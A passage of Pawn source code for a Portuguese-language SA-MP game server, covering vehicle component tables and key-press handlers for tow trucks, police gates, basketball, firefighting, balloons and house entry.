				case 34: { componentid = 1144; }
				case 35: { componentid = 1145; }
			}
		}
		case 589:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1004; }
				case 3: { componentid = 1005; }
				case 4: { componentid = 1006; }
				case 5: { componentid = 1007; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1013; }
				case 10: { componentid = 1016; }
				case 11: { componentid = 1017; }
				case 12: { componentid = 1018; }
				case 13: { componentid = 1020; }
				case 14: { componentid = 1024; }
				case 15: { componentid = 1025; }
				case 16: { componentid = 1073; }
				case 17: { componentid = 1074; }
				case 18: { componentid = 1075; }
				case 19: { componentid = 1076; }
				case 20: { componentid = 1077; }
				case 21: { componentid = 1078; }
				case 22: { componentid = 1079; }
				case 23: { componentid = 1080; }
				case 24: { componentid = 1081; }
				case 25: { componentid = 1082; }
				case 26: { componentid = 1083; }
				case 27: { componentid = 1084; }
				case 28: { componentid = 1085; }
				case 29: { componentid = 1087; }
				case 30: { componentid = 1096; }
				case 31: { componentid = 1097; }
				case 32: { componentid = 1098; }
				case 33: { componentid = 1144; }
				case 34: { componentid = 1145; }
			}
		}
		case 600:
		{
			switch(count)
			{
				case 1: { componentid = 1004; }
				case 2: { componentid = 1005; }
				case 3: { componentid = 1006; }
				case 4: { componentid = 1007; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1013; }
				case 9: { componentid = 1017; }
				case 10: { componentid = 1018; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1022; }
				case 13: { componentid = 1025; }
				case 14: { componentid = 1073; }
				case 15: { componentid = 1074; }
				case 16: { componentid = 1075; }
				case 17: { componentid = 1076; }
				case 18: { componentid = 1077; }
				case 19: { componentid = 1078; }
				case 20: { componentid = 1079; }
				case 21: { componentid = 1080; }
				case 22: { componentid = 1081; }
				case 23: { componentid = 1082; }
				case 24: { componentid = 1083; }
				case 25: { componentid = 1084; }
				case 26: { componentid = 1085; }
				case 27: { componentid = 1087; }
				case 28: { componentid = 1096; }
				case 29: { componentid = 1097; }
				case 30: { componentid = 1098; }
			}
		}
		case 603:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1006; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1017; }
				case 8: { componentid = 1018; }
				case 9: { componentid = 1019; }
				case 10: { componentid = 1020; }
				case 11: { componentid = 1023; }
				case 12: { componentid = 1024; }
				case 13: { componentid = 1025; }
				case 14: { componentid = 1073; }
				case 15: { componentid = 1074; }
				case 16: { componentid = 1075; }
				case 17: { componentid = 1076; }
				case 18: { componentid = 1077; }
				case 19: { componentid = 1078; }
				case 20: { componentid = 1079; }
				case 21: { componentid = 1080; }
				case 22: { componentid = 1081; }
				case 23: { componentid = 1082; }
				case 24: { componentid = 1083; }
				case 25: { componentid = 1084; }
				case 26: { componentid = 1085; }
				case 27: { componentid = 1087; }
				case 28: { componentid = 1096; }
				case 29: { componentid = 1097; }
				case 30: { componentid = 1098; }
				case 31: { componentid = 1142; }
				case 32: { componentid = 1143; }
				case 33: { componentid = 1144; }
				case 34: { componentid = 1145; }
			}
		}
		case 402,403,406..409,411..414,416,419,423,424,427..429,431..435,437,438,440..445,448,450,451,455..459,461..463,466..468,470,471,474,475,479..486,490,494,495,498,499,502..510,514,515,521..526,528,530..533,541,552,543..545,554..557,566,568,578,571..574,579,581..584,586..588,591,594,596..599,601,602,604..611:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1096; }
				case 20: { componentid = 1097; }
				case 21: { componentid = 1098; }
			}
		}
	}
	return componentid;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	///tunar de mecanico
	if(newkeys == KEY_SUBMISSION )
	{

		new playerstate = GetPlayerState(playerid);
		new playername[MAX_PLAYER_NAME];
		GetPlayerName(playerid,playername,sizeof(playername));
		if(!IsPlayerInAnyVehicle(playerid)){
		}
		else
		{
			if(playerstate != PLAYER_STATE_DRIVER){
			}
			else
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525)
				{
					new vehid2 = GetPlayerVehicleID(playerid);
					if(!IsTrailerAttachedToVehicle(vehid2)){
						new Float:x, Float:y, Float:z;
						GetVehiclePos(vehid2, x, y, z );
						new vehiclet;
						GetVehicleWithinDistance(playerid, x, y, z, 100.0, vehiclet);
						AttachTrailerToVehicle(vehiclet, vehid2);
						PlayerPlaySound(playerid, 3016, 0, 0, 0);
					}
					else
					{
						DetachTrailerFromVehicle(vehid2);
						SendClientMessage(playerid,COR_AMARELO,"[INFO] Voce destacou com sucesso esse veiculo");

					}
				}
			}
		}
	}
	//--------------------------------------------------------------------------
	//Portões DP
 	if((newkeys & 2) && !(oldkeys & 2) && IsPlayerInRangeOfPoint(playerid,7.0,1588.72571, -1638.08118, 14.48900) && getPolicial(playerid))
    {
    	MoveObject(PortaoDP,1588.72266, -1637.90125, 16.68900, 0.5,  0.00000, -90.00000, 90.00000);
    	SetTimer("FecharPortaoDP",7000,false);
    	return 1;
 	}
 	else if((newkeys & 2) && !(oldkeys & 2) && IsPlayerInRangeOfPoint(playerid,7.0,1544.67395, -1630.98694, 13.07270) && getPolicial(playerid))
 	{
 	    MoveObject(CancelaDP,1544.67395, -1630.98694, 13.07270+0.0001, 0.0001,  0.00000, 0.00000, 90.00000);
 	    SetTimer("FecharCancelaDP",5000,false);
 	    return 1;
	}
	//Basquete
	if((newkeys & KEY_CROUCH) && !(oldkeys & KEY_CROUCH) && !IsPlayerInAnyVehicle(playerid) && IsPlayerInRangeOfPoint(playerid, 30.0, 2782.1387,-2019.7159,13.5547))
	{
		if(HavingBall[playerid])
		{
			ApplyAnimation(playerid,"BSKTBALL","BBALL_idleloop",4.1,1,1,1,1,1);
		}
		else
		{
			ApplyAnimation(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0);
		}
		Anim[playerid] = 1;
	}
	if(newkeys & KEY_FIRE && !IsPlayerInAnyVehicle(playerid) && IsPlayerInRangeOfPoint(playerid, 30.0, 2782.1387,-2019.7159,13.5547))
	{
		if(!HavingBall[playerid])
		{
			new Float:x, Float:y, Float:z;
			GetObjectPos(Ball, x, y, z);
			if(IsPlayerInRangeOfPoint(playerid, 1.5, x, y, z))
			{
				HavingBall[playerid] = 1;
				ApplyAnimation(playerid,"BSKTBALL","BBALL_pickup",4.0,0,0,0,0,0);
				if(Baller != 999)
				{
					HavingBall[Baller] = 0;
					ClearAnimations(Baller);
					ApplyAnimation(Baller, "CARRY", "crry_prtial", 1.0,0,0,0,0, 0);
					ApplyAnimation(playerid,"BSKTBALL","BBALL_walk",4.1,1,1,1,1,1);
				}
				Baller = playerid;
				BallStatus = 1;
				new Float:x2, Float:y2;
				GetXYInFrontOfPlayer(playerid, x2, y2, 0.8);
				GetPlayerPos(playerid, x, y, z);
				StopObject(Ball);
				MoveObject(Ball, x2, y2, z, 2.5);
				Anim[playerid] = 0;
				BallBounce = 0;
			}
		}
		else
		{

			if(IsPlayerInRangeOfPoint(playerid, 2, 2795.5237,-2019.6152,13.5547))
			{
				MoveObject(Ball, 2794.9612,-2019.5415,15.5075, 7.5);
				SetPlayerPos(playerid, 2795.5237,-2019.6152,13.5547);
				ApplyAnimation(playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,0);
				HavingBall[playerid] = 0;
				SetTimerEx("ClearAnim", 1100,0,"d", playerid);
				SetTimerEx("BallDown2", 1100,0,"d", playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 4, 2795.5237,-2019.6152,13.5547) && IsPlayerFacingPoint(playerid, 20, 2795.5237,-2019.6152,13.5547))
			{
				new rand = random(1);
				if(rand == 0)
				{
					MoveObject(Ball, 2794.9612,-2019.5415,15.5075, 10.5+random(4));
					ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
					ShootingBall = 2;
					HavingBall[playerid] = 0;
					return 1;
				}
				ShootMiss(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 7, 2795.5237,-2019.6152,13.5547) && IsPlayerFacingPoint(playerid, 20, 2795.5237,-2019.6152,13.5547))
			{
				new rand = random(2);
				if(rand == 0)
				{
					MoveObject(Ball, 2794.9612,-2019.5415,15.5075, 11.0+random(4));
					ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
					ShootingBall = 2;
					HavingBall[playerid] = 0;
					return 1;
				}
				ShootMiss(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10, 2795.5237,-2019.6152,13.5547) && IsPlayerFacingPoint(playerid, 20, 2795.5237,-2019.6152,13.5547))
			{
				new rand = random(3);
				if(rand == 0)
				{
					MoveObject(Ball, 2794.9612,-2019.5415,15.5075, 11.5+random(4));
					ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
					ShootingBall = 2;
					HavingBall[playerid] = 0;
					return 1;
				}
				ShootMiss(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 2, 2768.3669,-2019.6644,13.5547))
			{
				MoveObject(Ball, 2768.6289,-2019.7227,15.6287, 7.5);
				SetPlayerPos(playerid, 2768.3669,-2019.6644,13.5547);
				ApplyAnimation(playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,0);
				HavingBall[playerid] = 0;
				SetTimerEx("ClearAnim", 800,0,"d", playerid);
				SetTimerEx("BallDown3", 1100,0,"d", playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 4, 2768.3669,-2019.6644,13.5547) && IsPlayerFacingPoint(playerid, 20, 2768.3669,-2019.6644,13.5547))
			{
				new rand = random(1);
				if(rand == 0)
				{
					MoveObject(Ball, 2768.6289,-2019.7227,15.6287, 10.5+random(4));
					ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
					ShootingBall = 3;
					HavingBall[playerid] = 0;
					return 1;
				}
				ShootMiss2(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 7, 2768.3669,-2019.6644,13.5547) && IsPlayerFacingPoint(playerid, 20, 2768.3669,-2019.6644,13.5547))
			{
				new rand = random(2);
				if(rand == 0)
				{
					MoveObject(Ball, 2768.6289,-2019.7227,15.6287, 11.0+random(4));
					ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
					ShootingBall = 3;
					HavingBall[playerid] = 0;
					return 1;
				}
				ShootMiss2(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10, 2768.3669,-2019.6644,13.5547) && IsPlayerFacingPoint(playerid, 20, 2768.3669,-2019.6644,13.5547))
			{
				new rand = random(3);
				if(rand == 0)
				{
					MoveObject(Ball, 2768.6289,-2019.7227,15.6287, 11.5+random(4));
					ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
					ShootingBall = 3;
					HavingBall[playerid] = 0;
					return 1;
				}
				ShootMiss2(playerid);
				return 1;
			}
			for(new i; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(IsPlayerFacingPlayer(playerid, i, 15))
					{
						new Float:x, Float:y, Float:z;
						GetPlayerPos(i, x, y, z);
						if(IsPlayerInRangeOfPoint(playerid, 20.0, x, y, z))
						{
							Baller = i;
							HavingBall[playerid] = 0;
							ClearAnimations(playerid);
							ApplyAnimation(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0);
							SetTimerEx("ClearAnim", 700,0,"d", playerid);
							MoveObject(Ball, x, y, z, 13+random(4));
							Anim[i] = 0;
							ShootingBall = 6;
							ApplyAnimation(i,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0);
							return 1;
						}
					}
				}
			}
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid, x, y, z);
			HavingBall[playerid] = 0;
			new Float:x2, Float:y2;
			GetXYInFrontOfPlayer(playerid, x2, y2, 6.0);
			SetTimerEx("BallDown", 600,0,"df", playerid, z);
			MoveObject(Ball, x2, y2, z+random(8)+3, 10.0+random(4));
			ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
			ShootingBall = 0;
		}
	}
//==============================================================================
	if(!(newkeys & KEY_CROUCH) && (oldkeys & KEY_CROUCH) && !IsPlayerInAnyVehicle(playerid) && IsPlayerInRangeOfPoint(playerid, 20.0, 2782.1387,-2019.7159,13.5547))
	{
		ClearAnimations(playerid);
		Anim[playerid] = 0;
	}//
 	if(newkeys & KEY_FIRE)
 	{
        if(pInfo[playerid][Prof] == BOMBEIRO && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        {
            for(new i = 0; i < MaxFire; ++i)
            {
    			if(IsValidFire(i))
				{
				    if(PlayerFaces(playerid, FirePos[i][0],  FirePos[i][1],  FirePos[i][2], 12) && IsPlayerInRangeOfPoint(playerid, 10, FirePos[i][0],  FirePos[i][1],  FirePos[i][2]))
 	        		{
 	        		    new
 	        		        veiculo = GetPlayerVehicleID(playerid),
							modelo = GetVehicleModel(veiculo)
			 			;
 	        		    if(!strcmp(FirePlayer[i], PlayerName(playerid), true))
 	        		    {
 	        		        if(modelo == 407)
 	        		        {
	 	        		        if(FireBaixa[playerid] == -1)
								{
						    		FireHealth[i] -= 2;
								    #if defined Labels
							    		new
											string[128]
										;
								    	format(string, sizeof(string), "Incêndio AQUI!\nPorcentagem Fogo\n(%d / %d)", FireHealth[i], FireHealthMax[i]);
										Update3DTextLabelText(FireText[i], 0xFFFFFFFF, string);
										GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~y~~h~Apagando...~n~~w~Continue Clicando", 1000, 5);
									    #endif
								    if(FireHealth[i] <= 0)
								    {
										DeleteFire(i);
										GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~Incendio~n~~w~Apagado!", 3000, 5);
										KillTimer(FireTimerP[playerid]);

	                                    FireBaixa[playerid] = FireAtual[playerid];
										FireAtual[playerid] = 0;

										ResetPlayerWeapons(playerid);
										RemovePlayerMapIcon(playerid, 90);
										SendClientMessage(playerid, COR_AMARELO, "Volte para o corpo de bombeiros e de baixa no incêndio.");
										SendClientMessage(playerid, COR_AMARELO, "Você recebe pelo serviço após dar baixa.");
									}
								}
								else
								{
									GameTextForPlayer(playerid, "~n~~n~~n~~r~~h~ERRO!~n~~w~ESTACIONE O CAMINHAO", 1000, 5);
								}
							}
							else
							{
							    return 1;
							    //GameTextForPlayer(playerid, "~n~~n~~n~~r~~h~ERRO!~n~~w~VOCE NAO ESTA EM UM CAMINHAO", 1000, 5);
							}
						}
						else
						{
							GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~ERRO!~n~~w~SEM PERMISSAO~n~PARA ESSE INCENDIO!", 1000, 5);
						}
					}
				}
			}
        }
        else if(pInfo[playerid][Prof] == BOMBEIRO && GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
        {
        	if(GetPlayerWeapon(playerid) == 42)
	        {
	            for(new i = 0; i < MaxFire; ++i)
	 	    	{
	 	        	if(IsValidFire(i))
	 	        	{
	 	        	    if(PlayerFaces(playerid, FirePos[i][0],  FirePos[i][1],  FirePos[i][2], 1) && IsPlayerInRangeOfPoint(playerid, 4, FirePos[i][0],  FirePos[i][1],  FirePos[i][2]))
	 	        		{
	 	        		    if(!strcmp(FirePlayer[i], PlayerName(playerid), true))
 	        		    	{
 	        		    	    if(FireBaixa[playerid] == -1)
								{
						    		FireHealth[i] -= 2;
								    #if defined Labels
							    		new
											string[128]
										;
								    	format(string, sizeof(string), "Incêndio AQUI!\nPorcentagem Fogo\n(%d / %d)", FireHealth[i], FireHealthMax[i]);
										Update3DTextLabelText(FireText[i], 0xFFFFFFFF, string);
										GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~y~~h~Apagando...~n~~w~Continue Clicando", 1000, 5);
									    #endif
								    if(FireHealth[i] <= 0)
								    {
										DeleteFire(i);
										GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~Incendio~n~~w~Apagado!", 3000, 5);
										KillTimer(FireTimerP[playerid]);

	                                    FireBaixa[playerid] = FireAtual[playerid];
										FireAtual[playerid] = 0;

										ResetPlayerWeapons(playerid);
										SetPlayerArmas(playerid);
										RemovePlayerMapIcon(playerid, 90);
										SendClientMessage(playerid, COR_AMARELO, "Volte para o corpo de bombeiros e de baixa no incêndio.");
										SendClientMessage(playerid, COR_AMARELO, "Você recebe pelo serviço após dar baixa.");
									}
								}
								else
								{
									GameTextForPlayer(playerid, "~n~~n~~n~~r~~h~ERRO!~n~~w~ESTACIONE O CAMINHAO", 1000, 5);
								}
							}
							else
							{
							    GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~ERRO!~n~~w~SEM PERMISSAO~n~PARA ESSE INCENDIO!", 1000, 5);
							}
						}
					}
				}
			}
        }

		if(IsPlayerInAnyVehicle(playerid) && !EUmaBike(GetPlayerVehicleID(playerid)))
		{
		  	if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		  	{
				AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
			}
			if(pInfo[playerid][PLAYER_VIP] == 1 && ParticipandoEvento[playerid] == 0)
			{
				AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
			}
		}

 		if(ClickMause[playerid] == 1 && aInfo[playerid][Admin] == 1)
		{
			if(CheckID >= 500)
		 	{
		     	SendClientMessage(playerid, COR_ERRO, "Já foi criado o máximo de checkpoints! (Máximo: 500)");
		      	return 1;
			}
			new
				Float:g_x, Float:g_y, Float:g_z
			;
			GetPlayerPos(playerid, g_x, g_y, g_z);
	 		CheckPoint[CheckID][0] = g_x;
			CheckPoint[CheckID][1] = g_y;
			CheckPoint[CheckID][2] = g_z;
			CheckID ++;
			format(gStr, sizeof(gStr), "~b~~h~~n~~n~~n~~n~~n~~n~CheckPoint %d criado!", CheckID);
			GameTextForPlayer(playerid, gStr, 5000, 5);
		}
	}
	if(PRESSED(KEY_YES | KEY_WALK)) //COMANDOS BALÃO - Pra cima
	{
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    if(strcmp(bInfo[balaoid][BalaoDono], PlayerName(playerid), false))
			    {
			        format(gStr, sizeof(gStr), "Este balão pertence à %s e somente ele(a) pode conduzi-lo!", bInfo[balaoid][BalaoDono]);
			        SendClientMessage(playerid, 0xFF0000AA, gStr);
			    }
			    else
			    {
   					bpInfo[playerid][Direcao] = 1;
	    			bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			    }
			    return 1;
			}
		}
	}
	if(RELEASED(KEY_YES | KEY_WALK))
	{
	    bpInfo[playerid][Direcao] = 0;
	}
	if(PRESSED(KEY_NO | KEY_WALK)) // Pra baixo
	{
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    if(strcmp(bInfo[balaoid][BalaoDono], PlayerName(playerid), false))
			    {
			        format(gStr, sizeof(gStr), "Este balão pertence à %s e somente ele(a) pode conduzi-lo!", bInfo[balaoid][BalaoDono]);
			        SendClientMessage(playerid, 0xFF0000AA, gStr);
			    }
			    else
			    {
			        bpInfo[playerid][Direcao] = 2;
			   	    bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			    }
			    return 1;
			}
		}
	}
	if(RELEASED(KEY_NO | KEY_WALK))
	{
	    bpInfo[playerid][Direcao] = 0;
	}
	if(PRESSED(KEY_SECONDARY_ATTACK | KEY_YES)) // Pra frente
	{
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    if(strcmp(bInfo[balaoid][BalaoDono], PlayerName(playerid), false))
			    {
			        format(gStr, sizeof(gStr), "Este balão pertence à %s e somente ele(a) pode conduzi-lo!", bInfo[balaoid][BalaoDono]);
			        SendClientMessage(playerid, 0xFF0000AA, gStr);
			    }
			    else
			    {
			        bpInfo[playerid][Direcao] = 3;
			   	    bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			    }
			    return 1;
			}
		}
	}
	if(RELEASED(KEY_SECONDARY_ATTACK | KEY_YES))
	{
	    bpInfo[playerid][Direcao] = 0;
	}
	if(PRESSED(KEY_SECONDARY_ATTACK | KEY_NO)) // Pra tráz
	{
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    if(strcmp(bInfo[balaoid][BalaoDono], PlayerName(playerid), false))
			    {
			        format(gStr, sizeof(gStr), "Este balão pertence à %s e somente ele(a) pode conduzi-lo!", bInfo[balaoid][BalaoDono]);
			        SendClientMessage(playerid, 0xFF0000AA, gStr);
			    }
			    else
			    {
			        bpInfo[playerid][Direcao] = 4;
			   		bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			    }
			    return 1;
			}
		}
	}
	if(RELEASED(KEY_SECONDARY_ATTACK | KEY_NO))
	{
	    bpInfo[playerid][Direcao] = 0;
	}
	if(PRESSED(KEY_CROUCH | KEY_YES)) // Pra direita
	{
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    if(strcmp(bInfo[balaoid][BalaoDono], PlayerName(playerid), false))
			    {
			        format(gStr, sizeof(gStr), "Este balão pertence à %s e somente ele(a) pode conduzi-lo!", bInfo[balaoid][BalaoDono]);
			        SendClientMessage(playerid, 0xFF0000AA, gStr);
			    }
			    else
			    {
			        bpInfo[playerid][Direcao] = 5;
			   		bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			    }
			    return 1;
			}
		}
	}
	if(RELEASED(KEY_CROUCH | KEY_YES))
	{
	    bpInfo[playerid][Direcao] = 0;
	}
	if(PRESSED(KEY_CROUCH | KEY_NO)) // Pra esquerda
	{
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    if(strcmp(bInfo[balaoid][BalaoDono], PlayerName(playerid), false))
			    {
			        format(gStr, sizeof(gStr), "Este balão pertence à %s e somente ele(a) pode conduzi-lo!", bInfo[balaoid][BalaoDono]);
			        SendClientMessage(playerid, 0xFF0000AA, gStr);
			    }
			    else
			    {
			        bpInfo[playerid][Direcao] = 6;
			    	bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			    }
			    return 1;
			}
		}
	}
	if(RELEASED(KEY_CROUCH | KEY_NO))
	{
	    bpInfo[playerid][Direcao] = 0;
	}//FIM COMANDOS BALÃO
	if(newkeys & KEY_SECONDARY_ATTACK)
	{
        if(!IsPlayerInAnyVehicle(playerid))
		{
            new
				Float:myx, Float:myy, Float:myz, myvehicle
			;
            GetPlayerPos(playerid, myx, myy, myz);
            GetVehicleWithinDistance(playerid, myx, myy, myz, 20.0, myvehicle);
            if(IsVehicleRc(myvehicle))
			{
				PutPlayerInVehicle(playerid, myvehicle, 0);
            }
        }
        else
		{
            new
				vehicleID = GetPlayerVehicleID(playerid)
			;
            if(IsVehicleRc(vehicleID) || GetVehicleModel(vehicleID) == RC_CAM)
			{
				if(GetVehicleModel(vehicleID) != D_TRAM)
				{
                	new
						Float:myx, Float:myy, Float:myz
					;
                	GetPlayerPos(playerid, myx, myy, myz);
                	SetPlayerPos(playerid, myx+0.5, myy, myz+1.0);
                }
            }
        }
	    if(pHospital[playerid] > gettime())
		{
			return 1;
		}
		for(new c; c < MAX_CASAS; ++c)
		{
      		if(IsPlayerInRangeOfPoint(playerid, 1.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
			{
            	if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false) &&
					strcmp(CasaInfo[c][Morador], PlayerName(playerid), false) &&
					strcmp(CasaInfo[c][Morador2], PlayerName(playerid), false) &&
					strcmp(CasaInfo[c][Morador3], PlayerName(playerid), false))
              	{
                 	if(CasaInfo[c][Status] == 1)
					{
						SendClientMessage(playerid, COR_ERRO, "Essa casa está fechada!");
						return 1;
					}
				}
				InHouse[playerid] = CasaInfo[c][Numero];
				if(strcmp(CasaInfo[InHouse[playerid]][Proprietario], PlayerName(playerid), true) == 0)
				{
					format(gStr, sizeof(gStr), "Olá %s, você está na sua casa ID %d.", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero]);
					SendClientMessage(playerid, AZUL_WE, gStr);
           		}
				else
				{
					format(gStr, sizeof(gStr), "Olá %s, você está na casa ID %d, que pertence à %s", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero], CasaInfo[InHouse[playerid]][Proprietario]);
					SendClientMessage(playerid, AZUL_WE, gStr);
				}
    			SetPlayerPos(playerid, CasaInfo[c][InteriorX], CasaInfo[c][InteriorY], CasaInfo[c][InteriorZ]);
              	SetPlayerVirtualWorld(playerid, CasaInfo[c][VirtualWorld]);
              	SetPlayerInterior(playerid, CasaInfo[c][InteriorID]);
              	EntrouCasa[playerid] = 1;
            	return 1;
          	}
        	if(EntrouCasa[playerid] == 1)
         	{
         	    if(!IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[InHouse[playerid]][InteriorX], CasaInfo[InHouse[playerid]][InteriorY], CasaInfo[InHouse[playerid]][InteriorZ]))
         	    {
         	        SendClientMessage(playerid, COR_ERRO, "Você está longe da porta!");
         	        return 1;
         	    }
				if(strcmp(CasaInfo[InHouse[playerid]][Proprietario], PlayerName(playerid), true) == 0)
				{
					format(gStr, sizeof(gStr), "%s, você saiu da sua casa ID %d.", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero]);
					SendClientMessage(playerid, AZUL_WE, gStr);
            	}
				else
				{
					format(gStr, sizeof(gStr), "%s, você saiu da casa ID %d, que pertence à %s", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero], CasaInfo[InHouse[playerid]][Proprietario]);
                  	SendClientMessage(playerid, AZUL_WE, gStr);
				}
	     		SetPlayerPos(playerid, CasaInfo[InHouse[playerid]][PickupX], CasaInfo[InHouse[playerid]][PickupY], CasaInfo[InHouse[playerid]][PickupZ]);
     			SetPlayerVirtualWorld(playerid, 0);
       			SetPlayerInterior(playerid, 0);
        	 	if(IsCasaIlha(CasaInfo[InHouse[playerid]][Numero]))
				{
					TogglePlayerControllable(playerid, false);
					SetTimerEx("DescongelarIlha", 5000, false, "d", playerid);
				}
				EntrouCasa[playerid] = 0;
	     		InHouse[playerid] = -1;
				return 1;
            }
 		}
	  	for(new m = 0; m < MAX_EMPRESAS; ++m)
		{
	        if(IsPlayerInRangeOfPoint(playerid, 1.0, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
	        {
        	    if(EntrouEmpresa[playerid] == 0)
                {
                    if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
                    	if(EmpresaInfo[m][Aberta] == 0)
						{
							SendClientMessage(playerid, COR_ERRO, "Esta empresa está fechada!");
							return 1;
						}
					}
                    SetPlayerVirtualWorld(playerid, EmpresaInfo[m][VirtualWorld]);
                    SetPlayerInterior(playerid, EmpresaInfo[m][InteriorID]);
                	SetPlayerPos(playerid, EmpresaInfo[m][InteriorX], EmpresaInfo[m][InteriorY], EmpresaInfo[m][InteriorZ]);
					InCompanyPickup[playerid] = m;
                	if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), true) == 0)
					{
   	     				format(gstring, sizeof(gstring), "Você está na sua Empresa ID %d - %s, %s", EmpresaInfo[m][Numero], EmpresaInfo[m][NomeEmp], PlayerName(playerid));
						SendClientMessage(playerid, 0x1E90FFAA, gstring);
                	}
					else
					{
